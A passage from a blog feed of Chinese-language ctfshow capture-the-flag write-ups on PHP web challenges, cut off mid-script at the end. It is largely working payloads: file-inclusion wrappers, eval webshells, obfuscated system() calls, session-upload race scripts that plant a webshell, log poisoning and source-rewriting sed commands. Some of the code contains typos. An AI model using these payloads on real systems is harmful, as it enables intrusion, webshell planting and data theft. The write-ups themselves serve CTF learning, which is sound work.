(猜测)：</p>\n<p>如果用 echo 输出一个类对象，那么输出结果由<code> __toString()</code>控制，而在高版本中，<code>__toString</code>自动存在，其内容为<code>print $value;</code>, 同时也可自己控制</p>\n<h1 id=\"web-110\"><a href=\"#web-110\" class=\"headerlink\" title=\"web 110\"></a>web 110</h1><p>过滤了各种字符，采用<code>FilesystemIterator</code>，参数写<code>getcwd</code>，<code>getcwd</code>用来取得当前工作目录， 两个连用后返回第一个名字</p>\n<h1 id=\"web-111\"><a href=\"#web-111\" class=\"headerlink\" title=\"web 111\"></a>web 111</h1><p>采用超全局变量GLOBALS，获取全局作用域下的可用的全部变量</p>\n<h1 id=\"web-112\"><a href=\"#web-112\" class=\"headerlink\" title=\"web 112\"></a>web 112</h1><pre><code class=\"php\">?file=php://filter/resource=flag.php\n?file=php://filter/convert.base32-encode/resource=flag.php// 当然 base32 等其他的 base 系列都是可以的，或者其他的编码形式\n?file=php://filter/read=convert.quoted-printable-encode/resource=flag.php\n?file=compress.zlib://flag.php\n?file=php://filter/read=convert.iconv.utf-8.utf-16le/resource=flag.php\n</code></pre>\n<h1 id=\"web-113\"><a href=\"#web-113\" class=\"headerlink\" title=\"web 113\"></a>web 113</h1><p><code>is_file()</code>也支持一些包装器和伪协议，返回的值为 false</p>\n<h2 id=\"解法一-1\"><a href=\"#解法一-1\" class=\"headerlink\" title=\"解法一\"></a>解法一</h2><p>过滤器被过滤，使用压缩流<code>?file=compress.zlib://flag.php</code></p>\n<h2 id=\"解法二-1\"><a href=\"#解法二-1\" class=\"headerlink\" title=\"解法二\"></a>解法二</h2><p>linux 里<code>/proc/self/root</code>是指向根目录的，也就是如果在命令行中输入<code>ls /proc/self/root</code>，其实显示的内容是根目录下的内容多次重复后绕过<code>is_file</code></p>\n<p>使用脚本跑，得到 payload</p>\n<h1 id=\"web-114\"><a href=\"#web-114\" class=\"headerlink\" title=\"web 114\"></a>web 114</h1><p>filter</p>\n<h1 id=\"web-115\"><a href=\"#web-115\" class=\"headerlink\" title=\"web 115\"></a>web 115</h1><pre><code class=\"php\">&lt;?php\nfor ($i = 1; $i &lt;= 128; $i = $i + 1) {\n    $temp = chr($i) . '1';\n    if (is_numeric($temp) &amp;&amp; trim($temp) !== '1') {\n        echo urlencode($temp), PHP_EOL;\n    }\n}\n</code></pre>\n<p>得到</p>\n<pre><code class=\"raw\">%0C1\n%2B1\n-1\n.1\n01\n11\n21\n31\n41\n51\n61\n71\n81\n91\n</code></pre>\n<p>对比过滤的符号，发现只有<code>%0c</code>可以用 </p>\n<p>payload:<code>?num=%0c36</code></p>\n<h1 id=\"web-117\"><a href=\"#web-117\" class=\"headerlink\" title=\"web 117\"></a>web 117</h1><p>主要是要通过这些判断语句</p>\n<p><code>is_numeric($num)</code></p>\n<p><code>$num !== '36'</code></p>\n<p><code>trim($num) !== '36'</code></p>\n<p><code>filter($num) == '36') $num == '36'</code></p>\n<p><code>is_numeric()</code>用于判断<code>num</code>是否为一个数字，在数字前面加上如<code>%20</code>的空格，那么仍为<code>true</code>，如果在后面加，那么为<code>false</code></p>\n<p>第二句为不全等于，如果加了空格，因为比较的是字符串的内容，所以一定能通过</p>\n<p>第三句为<code>trim()</code>函数的应用</p>\n<pre><code class=\"php\">此函数返回字符串 str 去除首尾空白字符后的结果。如果不指定第二个参数，trim() 将去除这些字符： \n◦ \" \" (ASCII 32 (0x20))，普通空格符。  \n◦ \"\\t\" (ASCII 9 (0x09))，制表符。  \n◦ \"\\n\" (ASCII 10 (0x0A))，换行符。  \n◦ \"\\r\" (ASCII 13 (0x0D))，回车符。  \n◦ \"\\0\" (ASCII 0 (0x00))，空字节符。  \n◦ \"\\x0B\" (ASCII 11 (0x0B))，垂直制表符。\n</code></pre>\n<p>`</p>\n<p><code>%0c</code>也还是可以使用，因此可以输入<code>%0c36</code>绕过</p>\n<p>第四句为函数`filter的通过，观察代码，上述能通过</p>\n<p>第五句为弱等于，由于比较的内容中有数字，因此两边都转换为数字，经过本地测试，<code>%0c36</code>转换成了数字36，因此也能通过判断</p>\n<p>所以payload:<code>?num=%0c36</code></p>\n<h1 id=\"web-123\"><a href=\"#web-123\" class=\"headerlink\" title=\"web 123\"></a>web 123</h1><p>对于该题，看到需要<code>POST CT_SHOW</code>和<code>CTF_SHOW.COM</code>的值</p>\n<p>由于PHP变量只能由数字字母下划线，故如果直接上传<code>CTF_SHOW.COM</code>后，<code>.</code>会自动转换成下划线，上传的实际上是<code>CTF_SHOW_COM</code>的变量</p>\n<p>而为了防止对后面的点进行转换，可以将<code>CTF</code>后的下划线改为左方括号，这样，只会将该括号改为下划线，而后面的点不受影响，但是如果将其换为<code>.</code>或<code>+</code>，两个符号均会变成下划线</p>\n<p>再看代码，之后会进行<code>eval</code>函数， <code>$c</code> 为POST传入的<code>$fun</code>值</p>\n<h2 id=\"解法一-2\"><a href=\"#解法一-2\" class=\"headerlink\" title=\"解法一\"></a>解法一</h2><p>传入命令<code>extract($_POST)</code>将变量转为POST类型，然后通过POST传入<code>fl0g=flag_give_me</code>绕过对GET变量的判断，并且满足第二个判断条件</p>\n<p>payload: <code>CTF_SHOW=1&amp;CTF[SHOW.COM=2&amp;fun=extract($_POST)&amp;fl0g=flag_give_me</code></p>\n<h2 id=\"解法二-2\"><a href=\"#解法二-2\" class=\"headerlink\" title=\"解法二\"></a>解法二</h2><p><code>get_defined_vars</code> —— 返回由所有已定义变量所组成的数组</p>\n<p>由于返回的是数组，<code>echo</code>输出数组只能输出<code>Array</code>，因此需要一个输出数组的函数或者将数组转换为字符串</p>\n<p>但输出数组的函数<code>var_dump()</code>,<code>print_r()</code>被禁用，故尝试使数组转换为字符串</p>\n<ul>\n<li><p>implode</p>\n<p>implode —— 将一个一维数组的值转化为字符串</p>\n<p>payload:<code>CTF_SHOW=1&amp;CTF[SHOW.COM=2&amp;fun=echo implode(get_defined_vars())</code></p>\n</li>\n</ul>\n<h2 id=\"解法三\"><a href=\"#解法三\" class=\"headerlink\" title=\"解法三\"></a>解法三</h2><p>利用<code>argv</code>数组</p>\n<p>数组中，用空格来进行值的分别</p>\n<p>GET:<code>?a=1+fl0g=flag_give_me</code></p>\n<p>POST:<code>CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=parse_str($a[1])</code></p>\n<h2 id=\"解法四\"><a href=\"#解法四\" class=\"headerlink\" title=\"解法四\"></a>解法四</h2><p>GET:<code>1=flag.php</code></p>\n<p>POST:<code>CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=highlight_file($_GET[1])</code></p>\n<h2 id=\"解法五\"><a href=\"#解法五\" class=\"headerlink\" title=\"解法五\"></a>解法五</h2><p><code>var_dump($GLOBALS)</code></p>\n<h1 id=\"web-125\"><a href=\"#web-125\" class=\"headerlink\" title=\"web 125\"></a>web 125</h1><p>过滤了<code>flag|GLOBALS|echo|var_dump|print</code></p>\n<p>仍可使用上面的法1、法3、法4</p>\n<h1 id=\"web-126\"><a href=\"#web-126\" class=\"headerlink\" title=\"web 126\"></a>web 126</h1><p>使用法三</p>\n<h1 id=\"web-127\"><a href=\"#web-127\" class=\"headerlink\" title=\"web 127\"></a>web 127</h1><p>用空格绕过 <code>_</code></p>\n<p><code>?ctf show=ilove36d</code></p>\n<p><code>$_SERVER [QUERY_STRING]</code>，经过验证，不能显示post传参的内容，故只能采取get传参</p>\n<h1 id=\"web-128\"><a href=\"#web-128\" class=\"headerlink\" title=\"web 128\"></a>web 128</h1><p>主要使用<code>gettext</code>函数</p>\n<p>获取当前信息，可以获取到参数中的值，而它又可以使用<code>_</code>代替该函数</p>\n<p>所以 payload:<code>?f1=_&amp;f2=get_defined_vars</code></p>\n<h1 id=\"web-129\"><a href=\"#web-129\" class=\"headerlink\" title=\"web 129\"></a>web 129</h1><p>目录穿越</p>\n<p><code>../ctfshow/../html/flag.php</code> （或其他)</p>\n<h1 id=\"web-130\"><a href=\"#web-130\" class=\"headerlink\" title=\"web 130\"></a>web 130</h1><p><code>f=ctfshow</code></p>\n<p>或数组绕过</p>\n<p><code>f[]=1</code></p>\n<h1 id=\"web-131\"><a href=\"#web-131\" class=\"headerlink\" title=\"web 131\"></a>web 131</h1><p><code>$a = str_repeat(\"show\",250000); $b = $a . \"36Dctfshow\"; echo $b;</code></p>\n<p>长度限制，绕过正则</p>\n<h1 id=\"web-132\"><a href=\"#web-132\" class=\"headerlink\" title=\"web 132\"></a>web 132</h1><p>逻辑运算符的优先级判断</p>\n<p>payload:<code>?username=admin&amp;password=1&amp;code=adm3in</code></p>\n<h1 id=\"web-133\"><a href=\"#web-133\" class=\"headerlink\" title=\"web 133\"></a>web 133</h1><h2 id=\"curl-外带\"><a href=\"#curl-外带\" class=\"headerlink\" title=\"curl 外带\"></a>curl 外带</h2><p>curl</p>\n<h2 id=\"Linux-中的-cp-命令\"><a href=\"#Linux-中的-cp-命令\" class=\"headerlink\" title=\"Linux 中的 cp 命令\"></a>Linux 中的 cp 命令</h2><p>利用<code>cp</code>命令将flag.php写入1.txt，然后访问1.txt</p>\n<pre><code class=\"raw\">payload：\n?F=`$F` ;cp flag.php 1234.txt\n/1234.txt\n</code></pre>\n<p>注意是反引号，相当于shell_exec()函数</p>\n<p>成功原因</p>\n<p>虽然<code>substr</code>只取前六位，但在该payload中，由于前六位是</p>\n<pre><code class=\"raw\">`$F` ;\n</code></pre>\n<p>读入后变量的值会放进去变成</p>\n<pre><code class=\"raw\">``$F` ;cp flag.php 1234.txt`\n</code></pre>\n<h2 id=\"PING\"><a href=\"#PING\" class=\"headerlink\" title=\"PING\"></a>PING</h2><h1 id=\"web-134\"><a href=\"#web-134\" class=\"headerlink\" title=\"web 134\"></a>web 134</h1><p>观察代码</p>\n<p><code>parse_str</code> — 将字符串解析成多个变量</p>\n<p><code>extract</code> — 从数组中将变量导入到当前的符号表 (如果变量已存在，将会覆盖变量)</p>\n<p>由于不能在POST里直接传<code>key1</code>和<code>key2</code>的值，所以可以通过GET方式，传入变量名为<code>_POST</code>的变量，使得其在之后的<code>extract</code>能够覆盖原理啊的<code>key1</code>和<code>key2</code></p>\n<p>payload:<code>?_POST[key1]=36d&amp;_POST[key2]=36d</code></p>\n<h1 id=\"web-135\"><a href=\"#web-135\" class=\"headerlink\" title=\"web 135\"></a>web 135</h1><h2 id=\"cp-命令\"><a href=\"#cp-命令\" class=\"headerlink\" title=\"cp 命令\"></a>cp 命令</h2><h2 id=\"ping\"><a href=\"#ping\" class=\"headerlink\" title=\"ping\"></a>ping</h2><h2 id=\"web-136\"><a href=\"#web-136\" class=\"headerlink\" title=\"web 136\"></a>web 136</h2><h2 id=\"tee-命令\"><a href=\"#tee-命令\" class=\"headerlink\" title=\"tee 命令\"></a>tee 命令</h2><p><code>?c=ls /|tee 1</code></p>\n<p>将<code>ls /</code>的回显写入1文件</p>\n<p>使用nl命令</p>\n<p>之后可以使用同样命令，然后返回即可</p>\n<h2 id=\"修改文件内容\"><a href=\"#修改文件内容\" class=\"headerlink\" title=\"修改文件内容\"></a>修改文件内容</h2><p><code>?c=ls |xargs sed -i 's/exec/echo/'</code></p>\n<p><code>?c=ls |xargs sed -i 's/exec/system/'</code></p>\n<p>重新访问题目，可以发现字符串匹配下<code>die</code>变为<code>echo</code>，也就是说，即使满足正则匹配，代码不会结束，会执行后面的代码</p>\n<p>无回显的<code>exec</code>变为了<code>system</code>，可以输入命令并回显</p>\n<h1 id=\"web-137\"><a href=\"#web-137\" class=\"headerlink\" title=\"web 137\"></a>web 137</h1><p>类静态方法的访问</p>\n<p>POST: <code>ctfshow=ctfshow::getFLag</code></p>\n<h1 id=\"web-138\"><a href=\"#web-138\" class=\"headerlink\" title=\"web 138\"></a>web 138</h1><p>ban掉了冒号</p>\n<p>查看文档，找寻访问静态方法的另一种手段</p>\n<p><code>call_user_func</code></p>\n<p><img data-src=\"/../../../../post_images/%E5%9B%BE%E7%89%87/static_visit.png\"></p>\n<p>也就是说可以通过给<code>call_user_func</code>传入一个数组，使其访问</p>\n<p>所以payload:<code>ctfshow[]=ctfshow&amp;ctfshow[]=getFlag</code>（该语句意义为给 ctfshow [] 赋两个值）</p>\n<h1 id=\"web-139\"><a href=\"#web-139\" class=\"headerlink\" title=\"web 139\"></a>web 139</h1><p>经过测试，如果想要<code>intval($code) == 'ctfshow'</code>为 true</p>\n<p>那么<code>code</code>也应该为字符串</p>\n<p>而<code>$code = eval(\"return $f1($f2());\");</code></p>\n<p>所以必须要使函数返回字符串，</p>\n<pre><code class=\"php\">f1=system&amp;f2=getcwd\nf1=system&amp;f2=system\n</code></pre>\n<h1 id=\"web-141\"><a href=\"#web-141\" class=\"headerlink\" title=\"web 141\"></a>web 141</h1><pre><code class=\"php\">if (is_numeric($v1) &amp;&amp; is_numeric($v2)) {\n        if (preg_match('/^\\W+$/', $v3)) {\n            $code =  eval(\"return $v1$v3$v2;\");\n            echo \"$v1$v3$v2 = \" . $code;\n        }\n    }\n</code></pre>\n<p>由判断及正则匹配，知v1，v2为数字，v3为非字母</p>\n<p>测试</p>\n<pre><code class=\"php\">$test = $_GET['test'];\neval(\"$test;\");\n?test=phpinfo()\n</code></pre>\n<p><code>phpinfo()</code> 被成功执行，也就是说该写法成立 (相当于以前的`eval ($c));?c=phpinfo())</p>\n<p>在上面的语句中，分号已写不用自己补，因此会执行该代码</p>\n<p>而由于题目执行的代码是<code>$v1$v3$v2</code>,<code>v1</code>，<code>v2</code>必为数字，所以可控的字符只有<code>v3</code>，并要将其于前后分开</p>\n<p>进行测试</p>\n<pre><code class=\"php\">1-phpinfo()-1\n</code></pre>\n<p>可以执行，所以可以传入<code>?v1=1&amp;v2=1&amp;v3=</code>命令进行</p>\n<p>但又因<code>3</code>不能出现字母，而大多数函数都有字母，这里采用<code>16</code>进制构造的方法构造出命令</p>\n<p>例如</p>\n<pre><code class=\"php\">//system('ls')\n?v1=1&amp;v2=1&amp;v3=-(%80%80%80%80%80%80^%f3%f9%f3%f4%e5%ed)(%80%80^%ec%f3)-   \n//system('tac flag.php')\n?v1=1&amp;v2=1&amp;v3=-(%80%80%80%80%80%80^%f3%f9%f3%f4%e5%ed)(%80%80%80%80%80%80%80%80%80%80%80%80^%f4%e1%e3%a0%e6%ec%e1%e7%ae%f0%e8%f0)-\n</code></pre>\n<h1 id=\"web-142\"><a href=\"#web-142\" class=\"headerlink\" title=\"web 142\"></a>web 142</h1><p>输入小于等于0的数字即可</p>\n<h1 id=\"web-143\"><a href=\"#web-143\" class=\"headerlink\" title=\"web 143\"></a>web 143</h1><p>同141，把减号换成乘号</p>\n<h1 id=\"web-144\"><a href=\"#web-144\" class=\"headerlink\" title=\"web 144\"></a>web 144</h1><p>原理同141, 调整一下v2，v3</p>\n<pre><code class=\"php\">?v1=1&amp;v2=(%80%80%80%80%80%80^%f3%f9%f3%f4%e5%ed)(%80%80%80%80%80%80%80%80%80%80%80%80^%f4%e1%e3%a0%e6%ec%e1%e7%ae%f0%e8%f0)&amp;v3=-\n</code></pre>\n<h1 id=\"web-145\"><a href=\"#web-145\" class=\"headerlink\" title=\"web 145\"></a>web 145</h1><p>相同原理</p>\n<p>这里使用取反运算 (或运算不能用，应为如果要用或，那么值一定在0-128内，而此时因为绝大部分可用字符被禁，也就是说此时不能构造出满足条件的)</p>\n<p>并使用三元条目运算符 <code>?ex1:ex2</code></p>\n<p><code>?v1=1&amp;v2=1&amp;v3=?(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%99%D5):</code></p>\n<p>或者用没有过滤的或运算</p>\n<p><code>?v1=1&amp;v2=1&amp;v3=|(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%99%D5)|</code></p>\n<h1 id=\"web-146\"><a href=\"#web-146\" class=\"headerlink\" title=\"web 146\"></a>web 146</h1><p>同145第二种解法</p>\n<h1 id=\"web-147\"><a href=\"#web-147\" class=\"headerlink\" title=\"web 147\"></a>web 147</h1><p><code>if (!preg_match('/^[a-z0-9_]*$/isD', $ctfshow))</code></p>\n<p>不能有数字字母开头</p>\n<p>利用命名空间<code>\\函数名</code></p>\n<p>首先使用<code>\\phpinfo</code>, 发现提示用了2个函数</p>\n<p>这里可以采用匿名函数，然后传入<code>show</code>使其闭合<code>if</code>判断，最后注释后面的语句</p>\n<p>payload:</p>\n<pre><code class=\"php\">?show=}system('tac flag.php');/*\nctf=\\create_function\n</code></pre>\n<h1 id=\"web-148\"><a href=\"#web-148\" class=\"headerlink\" title=\"web 148\"></a>web 148</h1><p>同 141</p>\n<p><strong>或者</strong></p>\n<p>调用函数方法</p>\n<pre><code class=\"php\">get_ctfshow_fl0g()\n?code = (%80%80%80%80%80%80%80%80%80%80%80%80%80%80%80%80^%e7%e5%f4%df%e3%f4%e6%f3%e8%ef%f7%df%e6%ec%b0%e7)();\n</code></pre>\n<h1 id=\"web-149\"><a href=\"#web-149\" class=\"headerlink\" title=\"web 149\"></a>web 149</h1><p>覆盖index.php</p>\n<p>payload：</p>\n<pre><code class=\"php\">?ctf=index.php \nPOST:show=&lt;?php eval($_POST[1]);?&gt;\n</code></pre>\n<h1 id=\"web-150\"><a href=\"#web-150\" class=\"headerlink\" title=\"web 150\"></a>web 150</h1><p>日志包含</p>\n<pre><code class=\"php\">&lt;?php eval($_REQUEST[1]);?&gt;\n</code></pre>\n<p>然后利用ctf传参，传入日志的路径，使日志被访问</p>\n<pre><code class=\"raw\">ctf=/var/log/nginx/access.log\n</code></pre>\n<p>设置isVIP的值为1，使最下面的if条件成立</p>\n<pre><code class=\"raw\">?isVIP=1\n</code></pre>\n<h1 id=\"web-150-plus\"><a href=\"#web-150-plus\" class=\"headerlink\" title=\"web 150-plus\"></a>web 150-plus</h1><p><code>__autoload()</code><br>当第一次使用一个类 A 时，如果找不到，会自动调用<code>__autoload()</code>方法，并将类名<code>A</code>作为参数传入，我们在<code>__autoload()</code>中需要的做的就是根据类名，找到相应的文件，并包含进来。</p>\n<p>本题中<code>class_exists()</code>类是第一次使用，可以通过对它的使用来调用 <code>autoload ()</code>这个魔术方法输出变量<code>$class</code></p>\n<p>过滤掉了<code>_</code>，可以通过<code>…</code>绕过</p>\n<p>因为题中有<code>extract</code>函数，会将传入的数组解析掉，所以get传入：<code>?..CTFSHOW…=phpinfo</code></p>\n<p><code>phpinfo()</code> 里面有flag</p>\n<p>预期解：<strong>条件竞争</strong></p>\n<p><code>ctf=1.php</code></p>\n<p><code>show=&lt;?php system('tac /c*');?&gt;</code></p>\n<p>使用bp不断访问并传参，然后开一个去不断访问1.php</p>\n",
            "tags": [
                "CTF",
                "ctfshow"
            ]
        },
        {
            "id": "http://dpm12345.cn/posts/31915a1e/",
            "url": "http://dpm12345.cn/posts/31915a1e/",
            "title": "文件包含",
            "date_published": "2022-10-04T14:12:40.000Z",
            "content_html": "<h1 id=\"web-78\"><a href=\"#web-78\" class=\"headerlink\" title=\"web 78\"></a>web 78</h1><p>php 伪协议</p>\n<h1 id=\"web-79\"><a href=\"#web-79\" class=\"headerlink\" title=\"web 79\"></a>web 79</h1><p>data伪协议<code>data://text/plain,&lt;?=eval($_POST[1]);?&gt;</code></p>\n<h1 id=\"web-80\"><a href=\"#web-80\" class=\"headerlink\" title=\"web 80\"></a>web 80</h1><p>data 协议被禁用</p>\n<p>可以尝试日志包含</p>\n<p><code>&lt;?php eval($_POST[1]);?&gt;</code></p>\n<h1 id=\"web-82\"><a href=\"#web-82\" class=\"headerlink\" title=\"web 82\"></a>web 82</h1><pre><code class=\"python\">#coding=utf-8\nimport io\nimport requests\nimport threading\nsessid = 'TGAO'          #sessionid 值，也为控制的文件名\ndata = {\"cmd\":\"system('whoami');\"}         #进行的命令\n\n# 写文件\ndef write(session):\n    while True:\n        f = io.BytesIO(b'a' * 1024 * 50)      #写入的文件内容\n        resp = session.post( 'http://127.0.0.1:5555/test56.php', data={'PHP_SESSION_UPLOAD_PROGRESS': '&lt;?php eval($_POST[\"cmd\"]);?&gt;'}, files={'file': ('tgao.txt',f)}, cookies={'PHPSESSID': sessid} )\n        #'PHP_SESSION_UPLOAD_PROGRESS': '&lt;?php eval ($_POST [\"cmd\"]);?&gt;' 为一句话木马\n        # files={'file': ('tgao.txt',f)} 为上传的文件\n        # cookies={'PHPSESSID': sessid}，设置 sessid，控制文件名\n        \n# 读文件\ndef read(session):\n    while True:\n        resp = session.post('http://127.0.0.1:5555/test56.php?file=session/sess_'+sessid,data=data)\n        if 'tgao.txt' in resp.text:\n            print(resp.text)\n            event.clear()\n        else:\n            print(\"[+++++++++++++]retry\")\nif __name__==\"__main__\":\n    event=threading.Event()\n    with requests.session() as session:\n        for i in xrange(1,30): \n            threading.Thread(target=write,args=(session,)).start()\n        for i in xrange(1,30):\n            threading.Thread(target=read,args=(session,)).start()\n    event.set()\n</code></pre>\n<pre><code class=\"python\">import requests\nimport io\nimport threading\nurl = ' http://4c773cea-91fa-498e-8027-46bab5889b16.challenge.ctf.show:8080/'\nsessionid = 'ctfshow'\ndata = {\n    \"1\": \"file_put_contents( '/var/www/html/2.php','&lt;?php eval($_ POST[2]);?&gt;');\"\n}\n\n\ndef write(session):\n    fileBytes = io.BytesI0(b' a'*1024*50)\n    while True:\n        response = session.post(url,\n                                data={\n                                    ' PHP_SESSION_UPLOAD_PROGRESS': '&lt;?php eval($_ POST[1]);?&gt;'\n                                },\n                                cookies={\n                                    ' PHPSESSID': sessionid\n                                },\n                                files={\n                                    'file': ('ctfshow.jpg ', fileBytes)\n                                }\n                                )\n\n\ndef read(session):\n    while True:\n        response = session.post(url + '?file=/tmp/sess_' + sessionid, data=data,\n                                cookies={\n                                    'PHPSESSID': sessionid\n                                }\n                                )\n        resposne2 = session.get(url + '2.php ')\n        if resposne2.status_code == 200:\n            print('++++++done++++++')\n        else:\n            print(resposne2.status_code)\n\n\nif __name__ == '__main__':\n    evnet = threading . Event()\n    with requests.session() as session:\n        for i in range(5):\n            threading. Thread(target=write, args=(session,)).start()\n        for i in range(5):\n            threading. Thread(target=read, args=(session,)) .start()\nevnet. set()\n</code></pre>\n<h1 id=\"web-83-x2F-84\"><a href=\"#web-83-x2F-84\" class=\"headerlink\" title=\"web 83 /84\"></a>web 83 /84</h1><p>83使用了</p>\n<pre><code class=\"php\">session_unset();\nsession_destroy;\n</code></pre>\n<p>84使用了</p>\n<pre><code class=\"php\">system(\"rm -rf /tmp/*\");\n</code></pre>\n<p>但都可以用82脚本跑出，第一个为脚本中session的设置，第二个为线程的作用，刚删但刚写</p>\n<h1 id=\"web-85\"><a href=\"#web-85\" class=\"headerlink\" title=\"web 85\"></a>web 85</h1><p>虽然有对内容”&lt;”的判断，但还是可以通过上面代码进行，增加线程即可</p>\n<h1 id=\"web-87\"><a href=\"#web-87\" class=\"headerlink\" title=\"web 87\"></a>web 87</h1><p>改为写文件了，可以使用过滤器</p>\n<pre><code class=\"php\">php://filter/write=string.rot13/resource=2.php\n</code></pre>\n<p>因为是对file的解码，因此对file的内容进行两次url编码，上传后，访问2.php文件即可</p>\n<h1 id=\"web-88\"><a href=\"#web-88\" class=\"headerlink\" title=\"web 88\"></a>web 88</h1><p>data 协议，base64 编码，构造出不带 =，+ 号的编码</p>\n<p><code>data://text/plain;base64,&lt;?php system('ls');?&gt;</code></p>\n<h1 id=\"web-117\"><a href=\"#web-117\" class=\"headerlink\" title=\"web 117\"></a>web 117</h1><p>伪协议，过滤器，死亡绕过</p>\n<p>通过转码使得院死亡代码无效，使自己的代码有效</p>\n<pre><code class=\"php\">?file=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=a.php\n</code></pre>\n",
            "tags": [
                "CTF",
                "ctfshow"
            ]
        },
        {
            "id": "http://dpm12345.cn/posts/b013ba57/",
            "url": "http://dpm12345.cn/posts/b013ba57/",
            "title": "信息收集 爆破 命令执行",
            "date_published": "2022-10-04T14:11:40.000Z",
            "content_html": "<h1 id=\"信息收集\"><a href=\"#信息收集\" class=\"headerlink\" title=\"信息收集\"></a>信息收集</h1><ol>\n<li>robots #</li>\n<li>域名解析 #</li>\n<li>.git<code>.svn</code>.swp </li>\n<li>editor 编辑器 如果访问一个不存在的目录，那么会列出根目录的所有文件 </li>\n<li>邮箱 qq 号泄漏部分信息 </li>\n<li>探针访问默认的 tz.php </li>\n<li>ip 访问，cdn 缓存清除 / 绕过，可加 www 绕过 </li>\n<li>Unicode 编码（可使用控制台输出) </li>\n<li>前端密码验证 可以绕过前端 js 直接 post 传入 </li>\n<li>access 数据库 db 目录下的 data.mdb db.mdb</li>\n<li></li>\n</ol>\n<h1 id=\"爆破\"><a href=\"#爆破\" class=\"headerlink\" title=\"爆破\"></a>爆破</h1><ol>\n<li>域名爆破子域名 <span class=\"exturl\" data-url=\"aHR0cDovL3BocGluZm8ubWUv\">phpinfo.me</span></li>\n<li>php_mt_seed</li>\n<li>\\uxx 可以用 consoleolog</li>\n<li></li>\n</ol>\n<h1 id=\"命令执行\"><a href=\"#命令执行\" class=\"headerlink\" title=\"命令执行\"></a>命令执行</h1><h2 id=\"Linux-中的-cp-命令\"><a href=\"#Linux-中的-cp-命令\" class=\"headerlink\" title=\"Linux 中的 cp 命令\"></a>Linux 中的 cp 命令</h2><p>利用cp命令将flag.php写入1.txt，然后访问1.txt</p>\n<p><code>system (\"cp fla?.php 1.txt\");</code>(对 flag 进行过滤)（mv 也行）</p>\n<h2 id=\"system-过滤可以使用反引号绕过，反引号作用相当于-system\"><a href=\"#system-过滤可以使用反引号绕过，反引号作用相当于-system\" class=\"headerlink\" title=\"system 过滤可以使用反引号绕过，反引号作用相当于 system\"></a>system 过滤可以使用反引号绕过，反引号作用相当于 system</h2><h2 id=\"嵌套-eval，主要用于过滤了相应查找的函数\"><a href=\"#嵌套-eval，主要用于过滤了相应查找的函数\" class=\"headerlink\" title=\"嵌套 eval，主要用于过滤了相应查找的函数\"></a>嵌套 eval，主要用于过滤了相应查找的函数</h2><p>payload:<code>?a=eval($_GET[1]);&amp;1=phpinfo();</code></p>\n<p>其中 <code>1</code> 已经逃逸，可以使用任何命令</p>\n<p>(可以使用 system (“tac flag.php”) 直接查看源码)(tac 为 cat 的逆序)</p>\n<h2 id=\"分号被-ban\"><a href=\"#分号被-ban\" class=\"headerlink\" title=\"分号被 ban\"></a>分号被 ban</h2><p>可以使用文件包含的方法，<code>include%0a$_GET [1]&amp;1=phpinfo();</code></p>\n<p>此时1已经逃逸，若想查看文件内容，可使用php伪协议，base-64编码查看 (同时可以把include换成require)</p>\n<h2 id=\"data-协议\"><a href=\"#data-协议\" class=\"headerlink\" title=\"data 协议\"></a>data 协议</h2><p><code>data://text/plain,(php代码)</code></p>\n<h2 id=\"web-40\"><a href=\"#web-40\" class=\"headerlink\" title=\"web 40\"></a>web 40</h2><pre><code class=\"php\">if (isset($_GET['c'])) {\n    $c = $_GET['c'];\n    eval($c);\n} else {\n    highlight_file(__FILE__);\n}\n</code></pre>\n<p>可用<code>show_source(next(array_reverse(scandir(pos(loc)lecony))));</code></p>\n<p>或者<code>?c=eval(arry_pop(next(get_difined_vars())));</code></p>\n<p>其中 <code>get_defined_vars()</code>,获取所有的变量值，之前可以进行打印，可以发现有 post 传值，传入后会有显示，那么需要拿到传上的值， </p>\n<p>由于 post 在第二个，可用 next 获取下一个，<code>array_pop()</code>弹出，然后使用<code>eval</code>执行</p>\n<p>执行过程</p>\n<p><img data-src=\"/../../../../post_images/%E5%9B%BE%E7%89%87/web40_1.png\"></p>\n<p><img data-src=\"/../../../../post_images/%E5%9B%BE%E7%89%87/web40_2.png\"></p>\n<p>可看到由于传值，使得post有值了</p>\n<p>那么接下来就是获取并执行</p>\n<h2 id=\"web-41\"><a href=\"#web-41\" class=\"headerlink\" title=\"web 41\"></a>web 41</h2><p>这个题过滤了<code>$、+、-、^、~</code>使得异或自增和取反构造字符都无法使用，同时过滤了字母和数字。但是特意留了个或运算符 |。</p>\n<p>我们可以尝试从 ascii 为 0-255 的字符中，找到或运算能得到我们可用的字符的字符。</p>\n<p>这里先给出两个脚本<code>exp.py``rce_or.php</code>，大家以后碰到可以使用或运算绕过的可以自己手动修改下即可。</p>\n<p>生成可用字符的集合</p>\n<pre><code class=\"php\">&lt;?php\n$myfile = fopen(\"rce_or.txt\", \"w\");\n$contents=\"\";\nfor ($i=0; $i &lt; 256; $i++) { \n    for ($j=0; $j &lt;256 ; $j++) { \n\n        if($i&lt;16){\n            $hex_i='0'.dechex($i);\n        }\n        else{\n            $hex_i=dechex($i);\n        }\n        if($j&lt;16){\n            $hex_j='0'.dechex($j);\n        }\n        else{\n            $hex_j=dechex($j);\n        }\n        $preg = '/[0-9]|[a-z]|\\^|\\+|\\~|\\$|\\[|\\]|\\{|\\}|\\&amp;|\\-/i';\n        if(preg_match($preg , hex2bin($hex_i))||preg_match($preg , hex2bin($hex_j))){\n                    echo \"\";\n    }\n  \n        else{\n        $a='%'.$hex_i;\n        $b='%'.$hex_j;\n        $c=(urldecode($a)|urldecode($b));\n        if (ord($c)&gt;=32&amp;ord($c)&lt;=126) {\n            $contents=$contents.$c.\" \".$a.\" \".$b.\"\\n\";\n        }\n    }\n\n}\n}\nfwrite($myfile,$contents);\nfclose($myfile);\n</code></pre>\n<p>大体意思就是<code>从进行异或的字符中排除掉被过滤的，然后再判断异或得到的字符是否为可见字符</code></p>\n<p>传递参数<code>getflag</code></p>\n<p>脚本</p>\n<pre><code class=\"python\"># -*- coding: utf-8 -*-\nimport requests\nimport urllib\nfrom sys import *\nimport os\nos.system(\"php rce_or.php\")  #没有将 php 写入环境变量需手动运行\nif(len(argv)!=2):\n    print(\"=\"*50)\n       print('USER：python exp.py &lt;url&gt;')\n       print(\"eg：  python exp.py http://ctf.show/\")\n       print(\"=\"*50)\n       exit(0)\nurl=argv[1]\ndef action(arg):\n       